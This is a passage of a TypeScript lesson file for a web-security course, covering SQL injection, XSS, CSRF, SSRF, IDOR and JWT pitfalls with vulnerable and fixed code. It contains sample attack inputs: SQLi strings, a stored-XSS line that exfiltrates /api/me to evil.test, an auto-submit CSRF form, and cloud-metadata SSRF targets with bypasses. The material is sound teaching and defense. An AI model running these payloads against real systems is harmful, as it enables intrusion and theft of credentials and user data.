import type { Module } from '../../types';

const raw = String.raw;

export const webModule: Module = {
  id: 'cyber-web',
  title: 'Web Exploitation & Defense (OWASP Core)',
  level: 'Beginner',
  lessons: [
    // ------------------------------------------------------------------------
    {
      id: 'cyber-sql-injection',
      title: 'SQL Injection: String Concatenation vs. Parameterized Queries',
      summary: 'How input becomes code inside the SQL parser, how auditors find it, and the one habit that removes the whole bug class.',
      difficulty: 'Beginner',
      minutes: 18,
      xp: 90,
      analogy:
        'Building SQL by gluing strings is like letting a customer write directly on the order slip the kitchen reads. A parameterized query hands the kitchen a sealed envelope: whatever is inside is treated as an ingredient, never as an instruction.',
      intuition: [
        { title: 'The database parses one string', body: "Your app sends the DB a single text buffer. The SQL parser tokenizes it into keywords, identifiers and literals. If user input is glued into that buffer, the parser cannot tell where your code ends and their data begins." },
        { title: 'A quote character changes the token stream', body: "With input `' OR '1'='1' --`, the parser sees: string literal `''`, keyword OR, literal `'1'`, operator `=`, literal `'1'`, then `--` starts a comment that swallows the password check. The WHERE clause is now always true." },
        { title: 'Blind and UNION variants', body: "If results are not shown, attackers ask yes/no questions (`AND substring(password,1,1)='a'`) and watch response differences or timing (`pg_sleep(5)`). If they are shown, `UNION SELECT` appends rows from other tables. Same root cause." },
        { title: 'Parameters separate code from data', body: "With `WHERE username = $1`, the query text is sent and parsed first. The value travels separately in the bind message (Postgres extended protocol: Parse → Bind → Execute). It is never tokenized as SQL, so no character in it can change the structure." },
        { title: 'Identifiers cannot be parameterized', body: "Column names in ORDER BY and table names are part of the structure. Map user choices to an allow-list of known identifiers instead of interpolating them." },
        { title: 'Defense in depth', body: "A least-privilege DB role (no DROP, no access to other schemas), Row Level Security, and generic error messages limit the damage if a bug slips through. Our own `supabase_schema.sql` uses RLS for exactly this reason." },
      ],
      callouts: [
        { kind: 'architecture', title: 'Postgres extended query protocol', body: 'The SQL text is fixed when it is parsed; values arrive later in Bind and never pass through the parser.', flow: ['Parse("SELECT … WHERE u = $1")', 'Bind($1 = user input bytes)', 'Execute', 'Rows'] },
        { kind: 'security', title: 'Practise legally', body: 'Test only applications you own or have written permission to test, such as OWASP Juice Shop, DVWA or PortSwigger Web Security Academy labs.' },
      ],
      code: {
        basic: {
          language: 'sql',
          filename: 'token-stream.sql',
          explanation: "What the database receives when the username field contains ' OR '1'='1' -- and how the parser tokenizes it.",
          code: raw`-- INTENDED QUERY TEMPLATE
--   SELECT id FROM users WHERE username = '<input>' AND password_hash = '<hash>';
--
-- INPUT: ' OR '1'='1' --
--
-- TOKEN STREAM THE PARSER SEES
--   SELECT | id | FROM | users | WHERE | username | = | ''  | OR | '1' | = | '1' | --comment...
--                                                     ^^^ empty string literal closes early
--                                                          ^^^^^^^^^^^^^^ always TRUE
--                                                                           ^^ rest ignored
SELECT id FROM users WHERE username = '' OR '1'='1' --' AND password_hash = '...';

-- PRECEDENCE: AND binds tighter than OR, but the comment removed the AND entirely,
-- so the predicate is simply (username = '') OR TRUE  ->  every row matches.`,
        },
        production: {
          language: 'py',
          filename: 'audit_sqli.py',
          explanation: 'Auditor pattern: grep a codebase for string-built SQL, then confirm with a parameterized rewrite. This is how reviewers find SQLi at scale before any testing.',
          code: raw`import re, pathlib

# Heuristics: SQL keywords in a string that is combined with variables via +, %, .format or f-strings
PATTERNS = [re.compile(p, re.I) for p in (
    r'(SELECT|INSERT|UPDATE|DELETE)[^"\n]*"\s*\+',        # "SELECT ... " + var
    r'f"[^"]*(SELECT|INSERT|UPDATE|DELETE)[^"]*\{',       # f"SELECT ... {var}"
    r'(SELECT|INSERT|UPDATE|DELETE)[^"\n]*"\s*%\s*',      # "... %s" % var
    r'\.(execute|query|raw)\(\s*[a-zA-Z_]+\s*\)',        # execute(sql_variable)
)]

def scan(root: str):
    for path in pathlib.Path(root).rglob("*.py"):
        for no, line in enumerate(path.read_text(errors="ignore").splitlines(), 1):
            if any(p.search(line) for p in PATTERNS):
                print(f"{path}:{no}: {line.strip()[:120]}")

scan("./src")   # then review each hit: is any part of the string user-controlled?`,
        },
        bug: {
          explanation:
            'The vulnerable login concatenates input into SQL and also sorts by a user-chosen column. The fix uses placeholders for values, an allow-list for the identifier, and a least-privilege query that only returns what it needs.',
          buggy: {
            language: 'ts',
            filename: 'users.repo.ts',
            code: raw`// ❌ Input becomes SQL (value AND identifier)
export async function login(username: string, password: string) {
  const sql = "SELECT * FROM users WHERE username = '" + username +
              "' AND password = '" + password + "'";        // plaintext passwords too!
  return (await pool.query(sql)).rows[0];
}

export async function listUsers(sort: string) {
  return (await pool.query('SELECT * FROM users ORDER BY ' + sort)).rows; // sort = "id; DROP TABLE users"
}`,
          },
          fixed: {
            language: 'ts',
            filename: 'users.repo.ts',
            code: raw`// ✅ Values are bound, identifiers are allow-listed
export async function findForLogin(username: string) {
  const { rows } = await pool.query(
    'SELECT id, password_hash FROM users WHERE username = $1',  // $1 is bound, never parsed
    [username],
  );
  return rows[0];   // then verify password_hash with argon2.verify()
}

const SORTABLE = { created: 'created_at', name: 'username' } as const;
export async function listUsers(sort: keyof typeof SORTABLE = 'created') {
  const column = SORTABLE[sort] ?? 'created_at';
  return (await pool.query('SELECT id, username FROM users ORDER BY ' + column + ' LIMIT 100')).rows;
}`,
          },
        },
      },
      takeaways: [
        'Concatenated SQL lets input change the token stream. Parameters never reach the parser.',
        'Placeholders for values, allow-lists for identifiers, least privilege for the role.',
        'Blind and UNION SQLi are the same bug with different ways of reading the result.',
        "Practice drill: rewrite `\"SELECT * FROM orders WHERE id = \" + req.params.id` with a placeholder, and explain why `id = 1 OR 1=1` can no longer return all orders.",
      ],
    },

    // ------------------------------------------------------------------------
    {
      id: 'cyber-xss-csp',
      title: 'Cross-Site Scripting (Stored, Reflected, DOM) & Content Security Policy',
      summary: "How attacker text becomes executable JavaScript in another user's browser, and how output encoding plus CSP stop it.",
      difficulty: 'Beginner',
      minutes: 20,
      xp: 100,
      analogy:
        "A café lets customers pin notes to a board. One customer pins a note that says \"Staff: give the next person the till keys.\" If staff obey notes instead of just displaying them, that is XSS. Encoding is laminating each note so it can only be read, never obeyed. CSP is a house rule: staff only follow instructions signed by the manager.",
      intuition: [
        { title: 'The browser parses HTML, then runs scripts it finds', body: "If your server returns `<p>Hello <script>steal()</script></p>`, the HTML parser builds a script element and the JS engine runs it with your site's origin: it can read cookies (if not HttpOnly), call your APIs, and change the page." },
        { title: 'Stored XSS', body: "The payload is saved (a comment, a profile bio) and served to every viewer. One write, many victims. Highest impact because no user interaction beyond viewing is needed." },
        { title: 'Reflected XSS', body: "The payload is in the request (`/search?q=<img src=x onerror=alert(1)>`) and echoed back in the response. The victim must open a crafted link." },
        { title: 'DOM XSS', body: "The server is never involved: client JS reads attacker-controlled data (`location.hash`, `postMessage`) and writes it into a sink like `innerHTML`, `document.write`, or `eval`. Server-side filters never see it." },
        { title: 'Context-aware output encoding', body: "In HTML text, `<` must become `&lt;`. In an attribute, quotes must be encoded. In a URL, `javascript:` schemes must be rejected. Frameworks like React encode text by default; `dangerouslySetInnerHTML` turns that off." },
        { title: 'CSP is the safety net', body: "`Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'` tells the browser to run only scripts carrying this response's random nonce. Injected `<script>` tags and inline `onerror=` handlers are blocked even if encoding failed somewhere." },
      ],
      callouts: [
        { kind: 'architecture', title: 'Where each XSS type enters', body: 'Stored and reflected XSS pass through the server; DOM XSS lives entirely in client-side JavaScript.', flow: ['Source (form, URL, hash, postMessage)', 'Server store / echo OR client JS', 'Sink (innerHTML, eval, href)', "Script runs in victim's origin"] },
        { kind: 'tip', title: 'Cookies: HttpOnly + Secure + SameSite', body: "HttpOnly stops `document.cookie` from reading session cookies, which limits (but does not remove) XSS impact. The script can still call your API as the user." },
      ],
      code: {
        basic: {
          language: 'html',
          filename: 'xss-types.html',
          explanation: 'Minimal pages for each XSS type. Run them only on localhost to watch the parser turn data into code.',
          code: raw`<!--
  HOW THE PARSER SEES A REFLECTED PAYLOAD
  server template:   <p>Results for: {{q}}</p>
  q = <img src=x onerror=alert(document.domain)>
  response bytes:    <p>Results for: <img src=x onerror=alert(document.domain)></p>
                                       ^^^^ new element    ^^^^^^^ event handler = JS
-->

<!-- STORED: comment saved in DB then rendered raw -->
<div class="comment">Nice post! <script>fetch('/api/me').then(r=>r.text()).then(t=>navigator.sendBeacon('https://evil.test',t))</script></div>

<!-- DOM: no server involvement; the sink is innerHTML -->
<div id="greet"></div>
<script>
  // URL:  /welcome#<img src=x onerror=alert(1)>
  const name = decodeURIComponent(location.hash.slice(1));   // SOURCE: attacker-controlled
  document.getElementById('greet').innerHTML = 'Hi ' + name;  // SINK: parses as HTML  ❌
  // safe sink:  .textContent = 'Hi ' + name;                 // treated as text      ✅
</script>`,
        },
        production: {
          language: 'ts',
          filename: 'csp.ts',
          explanation: 'Production pattern: per-response nonce CSP in Express, plus a report endpoint so you see violations (which are often attempted attacks or your own regressions).',
          code: raw`import crypto from 'node:crypto';
import express from 'express';

const app = express();

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');   // new random nonce per response
  res.locals.nonce = nonce;
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'nonce-" + nonce + "' 'strict-dynamic'",    // only scripts with this nonce
      "object-src 'none'",                                     // no Flash/plugins
      "base-uri 'none'",                                       // stops <base href> hijacks
      "frame-ancestors 'none'",                                // clickjacking defense
      'report-uri /csp-report',
    ].join('; '),
  );
  next();
});

// template: <script nonce="<%= nonce %>" src="/app.js"></script>
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP violation', req.body?.['csp-report']?.['blocked-uri']);
  res.sendStatus(204);
});`,
        },
        bug: {
          explanation:
            'React escapes text by default, but dangerouslySetInnerHTML and javascript: URLs bypass it. The fix renders text as text, sanitizes HTML when rich content is genuinely required, and validates URL schemes.',
          buggy: {
            language: 'tsx',
            filename: 'Comment.tsx',
            code: raw`// ❌ Two classic React XSS sinks
export function Comment({ c }: { c: { html: string; website: string } }) {
  return (
    <div>
      <div dangerouslySetInnerHTML={{ __html: c.html }} />   {/* stored XSS */}
      <a href={c.website}>author site</a>                    {/* javascript:alert(1) */}
    </div>
  );
}`,
          },
          fixed: {
            language: 'tsx',
            filename: 'Comment.tsx',
            code: raw`// ✅ Sanitize rich HTML, allow only http(s) links
import DOMPurify from 'dompurify';

const safeUrl = (u: string) => {
  try { const p = new URL(u); return p.protocol === 'https:' || p.protocol === 'http:' ? p.href : '#'; }
  catch { return '#'; }
};

export function Comment({ c }: { c: { html: string; website: string } }) {
  const clean = DOMPurify.sanitize(c.html, { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'code'] });
  return (
    <div>
      <div dangerouslySetInnerHTML={{ __html: clean }} />
      <a href={safeUrl(c.website)} rel="noopener noreferrer">author site</a>
    </div>
  );
}`,
          },
        },
      },
      takeaways: [
        'Stored, reflected and DOM XSS share one root cause: data reaches an HTML/JS sink unencoded.',
        'Encode for the output context; prefer textContent and framework escaping.',
        'Nonce-based CSP + HttpOnly cookies are the safety net, not the fix.',
        "Practice drill: find every `innerHTML`, `dangerouslySetInnerHTML` and `eval` in a project you own and classify each as safe, sanitized, or vulnerable.",
      ],
    },

    // ------------------------------------------------------------------------
    {
      id: 'cyber-csrf',
      title: 'Cross-Site Request Forgery (CSRF), SameSite & Origin Checks',
      summary: "Why a browser will happily send your cookies on a request another site started, and the three defenses that stop it.",
      difficulty: 'Beginner',
      minutes: 15,
      xp: 80,
      analogy:
        "You are logged in to your bank, which is like wearing a wristband at a festival. A stranger hands you a pre-filled form and you post it through the bank's letterbox. The bank sees your wristband and processes the transfer. CSRF tokens are a secret word the bank whispered to you when you came in; the stranger's form does not know it.",
      intuition: [
        { title: 'Browsers attach cookies automatically', body: "When any page submits a form to `bank.test`, the browser includes `bank.test` cookies (subject to SameSite). The server sees a valid session and cannot tell who initiated the request." },
        { title: 'The attack needs no script on the target', body: "An attacker page contains `<form action=https://bank.test/transfer method=POST>` with hidden fields and auto-submits it. No XSS, no stolen password: just the victim's existing session." },
        { title: 'SameSite cookies', body: "`SameSite=Lax` (Chrome's default when unset) withholds cookies on cross-site POSTs but sends them on top-level GET navigations. `Strict` withholds on all cross-site requests. So: never change state on GET." },
        { title: 'Synchronizer token', body: "The server issues a random token bound to the session and embeds it in its own forms. Every state-changing request must echo it. Cross-site pages cannot read it because of the same-origin policy." },
        { title: 'Origin / Fetch Metadata checks', body: "Modern browsers send `Origin` and `Sec-Fetch-Site: cross-site` headers. Rejecting state-changing requests whose Origin is not yours is a cheap, strong second layer." },
      ],
      callouts: [
        { kind: 'architecture', title: 'The forged request', body: 'The attacker never sees the response; they only need the side effect.', flow: ['Victim logged in to bank.test', 'Visits evil.test', 'Auto-submitted form → bank.test/transfer', 'Browser attaches cookie', 'Server executes transfer'] },
        { kind: 'warning', title: 'JSON APIs are not automatically safe', body: 'If your API accepts text/plain or form-encoded bodies, or CORS is misconfigured with credentials, cross-site requests can still reach it. Require a custom header or token for state changes.' },
      ],
      code: {
        basic: {
          language: 'html',
          filename: 'evil-page.html',
          explanation: 'The entire attack (for a deliberately vulnerable localhost lab app). Note there is no JavaScript needed beyond auto-submit.',
          code: raw`<!--
  REQUEST THE BROWSER SENDS (cookie added automatically if SameSite allows)
    POST /transfer HTTP/1.1
    Host: bank.localhost:3000
    Origin: http://evil.localhost:4000        <-- tells you it is cross-site
    Cookie: session=7f3c...                    <-- victim's cookie
    Content-Type: application/x-www-form-urlencoded

    to=attacker&amount=500
-->
<form id="f" action="http://bank.localhost:3000/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="500">
</form>
<script>document.getElementById('f').submit();</script>`,
        },
        production: {
          language: 'ts',
          filename: 'csrf-guard.ts',
          explanation: 'Defense-in-depth middleware: SameSite cookies, Fetch Metadata / Origin checks, and a double-submit token for state-changing methods.',
          code: raw`import crypto from 'node:crypto';

const SAFE = new Set(['GET', 'HEAD', 'OPTIONS']);
const ORIGIN = 'https://app.example.com';

export function csrfGuard(req, res, next) {
  // 1) issue a token cookie readable by OUR JS (not HttpOnly) for double-submit
  if (!req.cookies.csrf) {
    res.cookie('csrf', crypto.randomBytes(32).toString('hex'), { secure: true, sameSite: 'strict' });
  }
  if (SAFE.has(req.method)) return next();             // GET must never change state

  // 2) Fetch Metadata / Origin: reject cross-site state changes outright
  const site = req.get('Sec-Fetch-Site');
  if (site && site !== 'same-origin' && site !== 'none') return res.sendStatus(403);
  const origin = req.get('Origin');
  if (origin && origin !== ORIGIN) return res.sendStatus(403);

  // 3) token: header must match cookie (a cross-site page cannot read the cookie)
  const header = req.get('X-CSRF-Token') ?? '';
  const cookie = req.cookies.csrf ?? '';
  const ok = header.length === cookie.length && crypto.timingSafeEqual(Buffer.from(header), Buffer.from(cookie));
  return ok ? next() : res.sendStatus(403);
}

// session cookie itself:
// res.cookie('session', id, { httpOnly: true, secure: true, sameSite: 'lax' });`,
        },
        bug: {
          explanation:
            'The vulnerable app changes state on GET (so even SameSite=Lax cookies are sent on a top-level link) and has no token. The fix uses POST, SameSite, and token verification.',
          buggy: {
            language: 'ts',
            filename: 'routes.ts',
            code: raw`// ❌ State change on GET, no CSRF defense
// <img src="https://bank.example/transfer?to=attacker&amount=500"> on any site triggers it
app.get('/transfer', requireLogin, async (req, res) => {
  await transfer(req.user.id, req.query.to, Number(req.query.amount));
  res.send('done');
});`,
          },
          fixed: {
            language: 'ts',
            filename: 'routes.ts',
            code: raw`// ✅ POST only, protected by csrfGuard, amounts validated
app.post('/transfer', requireLogin, csrfGuard, async (req, res) => {
  const amount = Number(req.body.amount);
  if (!Number.isInteger(amount) || amount <= 0 || amount > 10_000) return res.sendStatus(400);
  await transfer(req.user.id, String(req.body.to), amount);
  res.json({ ok: true });
});`,
          },
        },
      },
      takeaways: [
        'CSRF abuses the browser attaching cookies to cross-site requests.',
        'Never change state on GET; use SameSite cookies, Origin/Fetch-Metadata checks, and tokens.',
        'Bearer tokens in an Authorization header are not sent automatically, so they are not CSRF-prone (but are XSS-exposed if stored in localStorage).',
        'Practice drill: list every POST/PUT/DELETE route in an app you own and confirm each one rejects a request with `Origin: https://evil.test`.',
      ],
    },

    // ------------------------------------------------------------------------
    {
      id: 'cyber-ssrf',
      title: 'Server-Side Request Forgery (SSRF) & Cloud Metadata',
      summary: 'When your server fetches a URL for a user, the user gets to aim your server at your own internal network.',
      difficulty: 'Intermediate',
      minutes: 18,
      xp: 100,
      analogy:
        "Your company's mailroom forwards any letter a visitor hands in. A visitor writes \"To: the CEO's office safe, please return contents to me\". The mailroom is inside the building, so the internal door opens for it. SSRF is tricking a trusted insider (your server) into making requests you could never make yourself.",
      intuition: [
        { title: 'Features that fetch URLs', body: "Link previews, image-from-URL uploads, webhooks, PDF renderers and import-from-URL all make the SERVER open an outbound connection to a destination the user chose." },
        { title: 'The server sits inside the trust boundary', body: "It can reach `localhost` admin ports, internal services (`http://redis:6379`), and the cloud metadata service at `169.254.169.254`, none of which are reachable from the internet." },
        { title: 'Metadata = credentials', body: "On AWS IMDSv1, `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns temporary access keys. One SSRF becomes access to the whole cloud account. IMDSv2 requires a PUT to obtain a session token first, which defeats most simple SSRF." },
        { title: 'Bypasses for naive filters', body: "Blocking the string `169.254.169.254` fails against `http://2852039166/` (decimal IP), `http://[::ffff:a9fe:a9fe]/`, DNS names that resolve to internal IPs, open redirects, and DNS rebinding (first lookup public, second internal)." },
        { title: 'Correct defense: resolve, check, connect, no redirects', body: "Parse the URL, resolve the hostname, reject private/loopback/link-local/reserved addresses, connect to that exact resolved IP, disable redirects, cap size and time. Best of all: route all outbound fetches through an egress proxy with an allow-list." },
      ],
      callouts: [
        { kind: 'architecture', title: 'SSRF pivot', body: 'The attacker never touches the internal network directly; your server does it for them.', flow: ['Attacker: url=http://169.254.169.254/…', 'Your API server (inside VPC)', 'Metadata service', 'IAM credentials in response', 'Echoed back to attacker'] },
        { kind: 'tip', title: 'Cloud hardening', body: 'Enforce IMDSv2 (HttpTokens=required), set hop limit 1 for containers, and give the instance role only the permissions that one service needs.' },
      ],
      code: {
        basic: {
          language: 'py',
          filename: 'ssrf_lab.py',
          explanation: 'A deliberately vulnerable preview endpoint for a local lab, with the address-space map that explains why each target is dangerous.',
          code: raw`#  ADDRESS SPACE YOUR SERVER CAN REACH (but the attacker cannot)
#  +---------------------+------------------------------+
#  | 127.0.0.0/8         | localhost admin panels, DBs  |
#  | 10/8 172.16/12 192.168/16 | internal services     |
#  | 169.254.169.254     | cloud metadata (credentials) |
#  | ::1, fc00::/7       | IPv6 loopback / private      |
#  +---------------------+------------------------------+
from flask import Flask, request
import requests

app = Flask(__name__)

@app.get("/preview")
def preview():
    url = request.args["url"]                       # attacker-controlled destination
    r = requests.get(url, timeout=5)                # ❌ follows redirects, any host, any port
    return r.text[:2000]                            # ❌ echoes the internal response back

# lab request:  /preview?url=http://127.0.0.1:8080/admin
#               /preview?url=http://169.254.169.254/latest/meta-data/`,
        },
        production: {
          language: 'py',
          filename: 'safe_fetch.py',
          explanation: 'Defender pattern: resolve once, validate every resolved address, refuse redirects, and cap time/size. (For maximum safety, also send traffic through an egress proxy.)',
          code: raw`import ipaddress, socket
from urllib.parse import urlsplit
import requests

ALLOWED_PORTS = {80, 443}

def _is_public(ip: str) -> bool:
    a = ipaddress.ip_address(ip)
    return not (a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
                or a.is_multicast or a.is_unspecified)

def safe_fetch(url: str, max_bytes: int = 2_000_000) -> bytes:
    u = urlsplit(url)
    if u.scheme not in ("http", "https") or not u.hostname:
        raise ValueError("scheme not allowed")
    port = u.port or (443 if u.scheme == "https" else 80)
    if port not in ALLOWED_PORTS:
        raise ValueError("port not allowed")

    infos = socket.getaddrinfo(u.hostname, port, proto=socket.IPPROTO_TCP)
    ips = {info[4][0] for info in infos}
    if not ips or not all(_is_public(ip) for ip in ips):     # ALL answers must be public
        raise ValueError("destination resolves to a non-public address")

    # NOTE: requests re-resolves DNS; to fully stop DNS rebinding, connect via an
    # egress proxy (e.g. Smokescreen) that applies the same IP rules at connect time.
    r = requests.get(url, timeout=(2, 3), allow_redirects=False, stream=True)
    if 300 <= r.status_code < 400:
        raise ValueError("redirects not allowed")
    body = r.raw.read(max_bytes + 1, decode_content=True)
    if len(body) > max_bytes:
        raise ValueError("response too large")
    return body`,
        },
        bug: {
          explanation:
            'A string blocklist is bypassed by alternate IP encodings, DNS names and redirects. The fix validates the resolved addresses and disables redirects, using safe_fetch from the researcher tab.',
          buggy: {
            language: 'py',
            filename: 'preview.py',
            code: raw`# ❌ Blocklist on the raw string
BLOCKED = ["localhost", "127.0.0.1", "169.254.169.254"]

def fetch_preview(url: str) -> str:
    if any(b in url for b in BLOCKED):
        raise ValueError("blocked")
    return requests.get(url, timeout=5).text
# bypasses: http://2852039166/  http://[::1]/  http://metadata.attacker.test (A -> 169.254.169.254)
#           https://public.example/redirect?to=http://127.0.0.1/`,
          },
          fixed: {
            language: 'py',
            filename: 'preview.py',
            code: raw`# ✅ Validate where the connection will ACTUALLY go
def fetch_preview(url: str) -> str:
    body = safe_fetch(url, max_bytes=500_000)      # resolve + check every IP + no redirects
    return body.decode("utf-8", errors="replace")[:2000]`,
          },
        },
      },
      takeaways: [
        'SSRF turns your server into a proxy into your own private network.',
        'Validate resolved IP addresses, not URL strings; block redirects; cap time and size.',
        'IMDSv2 and least-privilege instance roles limit the payoff if a bug slips through.',
        'Practice drill: convert 169.254.169.254 to a single decimal number (169·2^24 + 254·2^16 + 169·2^8 + 254) and explain why a string blocklist misses it.',
      ],
    },

    // ------------------------------------------------------------------------
    {
      id: 'cyber-idor-access-control',
      title: 'IDOR & Broken Access Control',
      summary: "The #1 OWASP risk: the server checks that you are logged in, but not that the thing you asked for is yours.",
      difficulty: 'Beginner',
      minutes: 15,
      xp: 90,
      analogy:
        "A hotel checks that you have a room key at the elevator, but every room door opens with any key. Changing `/rooms/412` to `/rooms/413` lets you into someone else's room. Authentication is \"are you a guest?\" Authorization is \"is this YOUR room?\"",
      intuition: [
        { title: 'Authentication vs. authorization', body: "Authentication proves identity (session, JWT). Authorization decides whether that identity may perform this action on this object. IDOR (Insecure Direct Object Reference) is missing authorization on object IDs." },
        { title: 'Trace the request', body: "`GET /api/invoices/1043` with a valid session. The handler runs `SELECT * FROM invoices WHERE id = 1043`. Nothing ties row 1043 to the caller, so any logged-in user can read any invoice by changing the number." },
        { title: 'Random IDs are not access control', body: "UUIDs make guessing harder but leak through URLs, logs, shared links and other APIs. The check must exist regardless of ID format." },
        { title: 'Vertical vs. horizontal', body: "Horizontal: user A reads user B's data (IDOR). Vertical: a normal user calls an admin function. Both come from authorization decided by the client, the UI hiding a button, or a forgotten route." },
        { title: 'Enforce at the data layer', body: "Scope every query by the owner (`WHERE id = $1 AND owner_id = $2`) or use database Row Level Security, so even a buggy handler cannot return rows the user does not own. This platform's `lesson_progress` table uses exactly that RLS pattern." },
      ],
      callouts: [
        { kind: 'architecture', title: 'Where the check must live', body: 'Hiding a button in the UI is not a control. The server and, ideally, the database must enforce ownership.', flow: ['Request (id=1043)', 'Authenticate session → user 7', 'Authorize: owner(1043) == 7 ?', 'Query scoped by owner / RLS', 'Response'] },
        { kind: 'security', title: 'Testing ethically', body: 'Test IDOR with two accounts you control on a system you own or are authorised to test. Accessing other real users\' data is unauthorised access.' },
      ],
      code: {
        basic: {
          language: 'sql',
          filename: 'rls.sql',
          explanation: 'Row Level Security makes the database itself refuse cross-user reads, even if the API forgets a WHERE clause.',
          code: raw`-- ROW OWNERSHIP MODEL
--   invoices
--   +------+----------+--------+
--   | id   | owner_id | amount |
--   +------+----------+--------+
--   | 1042 | user-7   |  120   |   <- visible to user-7 only
--   | 1043 | user-9   | 9800   |   <- invisible to user-7, even with "WHERE id = 1043"
--   +------+----------+--------+
alter table invoices enable row level security;

create policy invoices_owner_select on invoices
  for select to authenticated
  using (owner_id = auth.uid());            -- evaluated for EVERY row the query touches

create policy invoices_owner_update on invoices
  for update to authenticated
  using (owner_id = auth.uid())
  with check (owner_id = auth.uid());       -- cannot reassign a row to someone else

-- as user-7:  select * from invoices where id = 1043;   -> 0 rows`,
        },
        production: {
          language: 'py',
          filename: 'authz_test.py',
          explanation: 'Researcher pattern: an automated two-account authorization test. Every object created by user A must return 403/404 for user B. Run it in CI against a staging environment you own.',
          code: raw`import requests

BASE = "https://staging.example.com/api"
alice = requests.Session(); alice.headers["Authorization"] = "Bearer " + ALICE_TOKEN
bob   = requests.Session(); bob.headers["Authorization"]   = "Bearer " + BOB_TOKEN

ENDPOINTS = ["/invoices", "/documents", "/messages"]

for ep in ENDPOINTS:
    created = alice.post(BASE + ep, json={"title": "authz-probe"}).json()
    oid = created["id"]
    for method in ("GET", "PATCH", "DELETE"):
        r = bob.request(method, f"{BASE}{ep}/{oid}", json={"title": "pwned"})
        status = "OK" if r.status_code in (403, 404) else "IDOR!"
        print(f"{status:5} {method:6} {ep}/{oid} -> {r.status_code}")
    alice.delete(f"{BASE}{ep}/{oid}")      # clean up`,
        },
        bug: {
          explanation:
            'The vulnerable handler authenticates but never authorizes. The fix scopes the query by owner and returns 404 for both "missing" and "not yours", so attackers cannot enumerate valid IDs.',
          buggy: {
            language: 'ts',
            filename: 'invoices.ts',
            code: raw`// ❌ Logged in? Then you can read ANY invoice
app.get('/api/invoices/:id', requireLogin, async (req, res) => {
  const { rows } = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);
  res.json(rows[0] ?? null);
});`,
          },
          fixed: {
            language: 'ts',
            filename: 'invoices.ts',
            code: raw`// ✅ Ownership is part of the query
app.get('/api/invoices/:id', requireLogin, async (req, res) => {
  const { rows } = await db.query(
    'SELECT id, amount, created_at FROM invoices WHERE id = $1 AND owner_id = $2',
    [req.params.id, req.user.id],
  );
  if (!rows[0]) return res.sendStatus(404);     // same response for missing and not-yours
  res.json(rows[0]);
});`,
          },
        },
      },
      takeaways: [
        'Authentication ≠ authorization. Check ownership on every object access.',
        'Scope queries by owner or use Row Level Security, so the database enforces it too.',
        'Unguessable IDs reduce discovery but are never the control.',
        'Practice drill: write the two-account test for one endpoint of a project you own and confirm it prints OK for GET, PATCH and DELETE.',
      ],
    },

    // ------------------------------------------------------------------------
    {
      id: 'cyber-jwt-sessions',
      title: 'JWT & Session Security Pitfalls (alg:none, weak secrets, rotation)',
      summary: 'How signed tokens are verified byte by byte, the classic verification mistakes, and safe session lifecycles.',
      difficulty: 'Intermediate',
      minutes: 20,
      xp: 110,
      analogy:
        "A JWT is a concert wristband with a hologram. Anyone can read what is printed on it (Base64), but only the venue's hologram machine can make a valid hologram (the signature). The classic bugs are bouncers who accept wristbands with no hologram at all (alg:none), a hologram machine anyone can buy (weak secret), and wristbands valid forever (no expiry or rotation).",
      intuition: [
        { title: 'Structure: header.payload.signature', body: "Each part is Base64url. Header `{\"alg\":\"HS256\",\"typ\":\"JWT\"}`, payload `{\"sub\":\"7\",\"exp\":1700000000}`. Signature = HMAC-SHA256(secret, base64url(header) + \".\" + base64url(payload)). The payload is readable by anyone; the signature only proves it was not altered." },
        { title: 'alg:none', body: "Some old libraries honored the token's own header. Setting `alg` to `none` with an empty signature made them skip verification. Fix: the SERVER decides the allowed algorithm list; never read it from the token." },
        { title: 'Algorithm confusion', body: "If a server expects RS256 (verify with a public key) but a library accepts HS256 too, an attacker signs an HS256 token using the PUBLIC key bytes as the HMAC secret. Same fix: pin `algorithms=[\"RS256\"]`." },
        { title: 'Weak HMAC secrets are crackable offline', body: "Anyone holding one valid HS256 token can brute-force the secret offline (hashcat mode 16500) because they can check guesses locally. Use at least 256 random bits, or asymmetric keys." },
        { title: 'Validate every claim', body: "Check `exp`, `nbf`, `iss`, `aud`, and that `sub` exists. A token for service A must be rejected by service B (audience)." },
        { title: 'Revocation and rotation', body: "JWTs cannot be \"logged out\" without state. Keep access tokens short (5–15 minutes) and use rotating refresh tokens: each refresh returns a new refresh token and invalidates the old one. If an old one is ever reused, revoke the whole family (it was stolen)." },
      ],
      callouts: [
        { kind: 'architecture', title: 'Refresh-token rotation with reuse detection', body: 'Reuse of an already-rotated token means two parties hold it, so revoke everything.', flow: ['Login → access (10 min) + refresh R1', 'Refresh with R1 → access + R2 (R1 revoked)', 'Attacker replays R1', 'Server: R1 already used → revoke family', 'User re-authenticates'] },
        { kind: 'tip', title: 'Where to store tokens in the browser', body: 'HttpOnly, Secure, SameSite cookies keep tokens away from XSS (but need CSRF defenses). localStorage is readable by any script on the page.' },
      ],
      code: {
        basic: {
          language: 'py',
          filename: 'jwt_by_hand.py',
          explanation: 'Building and verifying an HS256 JWT with only the standard library, so every byte is visible.',
          code: raw`#  TOKEN LAYOUT
#  base64url(header) . base64url(payload) . base64url(HMAC_SHA256(secret, header_b64 + "." + payload_b64))
#  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJzdWIiOiI3IiwiZXhwIjoxNzAwMDAwMDAwfQ . <43 chars>
import base64, hashlib, hmac, json, time

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
unb64 = lambda s: base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))

def sign(payload: dict, secret: bytes) -> bytes:
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64(hmac.new(secret, h + b"." + p, hashlib.sha256).digest())
    return h + b"." + p + b"." + sig

def verify(token: bytes, secret: bytes) -> dict:
    h, p, s = token.split(b".")
